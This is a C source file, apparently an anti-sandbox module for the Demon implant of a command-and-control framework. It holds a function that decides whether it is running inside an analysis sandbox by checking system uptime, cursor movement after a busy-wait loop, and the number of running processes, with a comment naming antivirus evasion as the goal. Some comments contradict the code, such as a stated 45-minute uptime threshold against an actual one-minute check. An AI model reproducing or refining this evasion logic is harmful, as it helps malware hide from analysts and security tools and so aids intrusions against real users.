#include <Demon.h>
#include <core/AntiSandbox.h>

// Comprehensive sandbox detection using only available APIs 
BOOL IsRunningInSandbox() {
#ifdef DEBUG
    PUTS("[DEBUG] Starting comprehensive anti-sandbox checks");
#endif

    // Check 1: Screen resolution (sandboxes often use low resolution)
    int width = 0, height = 0;
    
    if (Instance->Win32.GetSystemMetrics) {
        width = Instance->Win32.GetSystemMetrics(SM_CXSCREEN);
        height = Instance->Win32.GetSystemMetrics(SM_CYSCREEN);
        
#ifdef DEBUG
        PRINTF("[DEBUG] Screen resolution: %dx%d\n", width, height);
#endif
/*       
        // More aggressive resolution check - modern systems have high DPI
      if (width < 1000 || height < 750) {
#ifdef DEBUG
            PUTS("[DEBUG] Low resolution detected - sandbox suspected");
#endif
            return TRUE;
        }*/ 
    }
 
    // Check 2: System uptime (sandboxes restart frequently)
    ULONG uptime = NtGetTickCount();
    
#ifdef DEBUG
    PRINTF("[DEBUG] System uptime: %lu ms\n", uptime);
#endif
    
    // 45 minutes minimum uptime (sandboxes typically run shorter)
    if (uptime < (1 * 60 * 1000)) {
#ifdef DEBUG
        PUTS("[DEBUG] Low uptime detected - sandbox suspected");
#endif
        return TRUE;
    }
    
    // Check 3: Probabilistic mouse cursor check
    // Make it random to avoid false positives while maintaining AV evasion
    if (Instance->Win32.GetCursorPos) {
        // 70% chance to perform cursor check (balances detection vs usability)
        volatile DWORD randomCheck = NtGetTickCount() % 10;
        
        if (randomCheck < 7) {  // 70% probability
#ifdef DEBUG
            PUTS("[DEBUG] Performing probabilistic cursor check");
#endif
            
            POINT cursorPos1, cursorPos2;
            
            if (Instance->Win32.GetCursorPos(&cursorPos1)) {
                // Reasonable delay for natural user interaction
                volatile DWORD counter = 0;
                for (volatile DWORD i = 0; i < 500000000; i++) {
                    counter++;
                }
                
                if (Instance->Win32.GetCursorPos(&cursorPos2)) {
#ifdef DEBUG
                    PRINTF("[DEBUG] Cursor position: (%ld,%ld) -> (%ld,%ld)\n", 
                           cursorPos1.x, cursorPos1.y, cursorPos2.x, cursorPos2.y);
#endif
                    
                    // Static cursor indicates automation/sandbox
                    if (cursorPos1.x == cursorPos2.x && cursorPos1.y == cursorPos2.y) {
#ifdef DEBUG
                        PUTS("[DEBUG] Static cursor detected - sandbox suspected");
#endif
                        return TRUE;
                    }
                }
            }
        } else {
#ifdef DEBUG
            PUTS("[DEBUG] Cursor check skipped - probabilistic decision");
#endif
        }
    }
    
    // Check 4: Process count (sandboxes typically run fewer processes)
    if (Instance->Win32.NtQuerySystemInformation && Instance->Win32.RtlAllocateHeap && Instance->Win32.RtlFreeHeap) {
        ULONG bufferSize = 0x10000;  // 64KB initial buffer
        PVOID buffer = Instance->Win32.RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, 0, bufferSize);
        
        if (buffer) {
            NTSTATUS status = Instance->Win32.NtQuerySystemInformation(
                SystemProcessInformation, buffer, bufferSize, &bufferSize);
            
            if (NT_SUCCESS(status)) {
                // Count running processes
                DWORD processCount = 0;
                PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
                
                while (processInfo->NextEntryOffset) {
                    processCount++;
                    processInfo = (PSYSTEM_PROCESS_INFORMATION)
                        ((PBYTE)processInfo + processInfo->NextEntryOffset);
                }
                
#ifdef DEBUG
                PRINTF("[DEBUG] Running processes: %lu\n", processCount);
#endif
                
                // Real systems typically have 60+ processes
                if (processCount < 50) {
#ifdef DEBUG
                    PUTS("[DEBUG] Low process count - sandbox suspected");
#endif
                    Instance->Win32.RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, buffer);
                    return TRUE;
                }
            }
            
            Instance->Win32.RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, buffer);
        }
    }
    
#ifdef DEBUG
    PUTS("[DEBUG] All checks passed - not a sandbox");
#endif
    
    return FALSE;
}
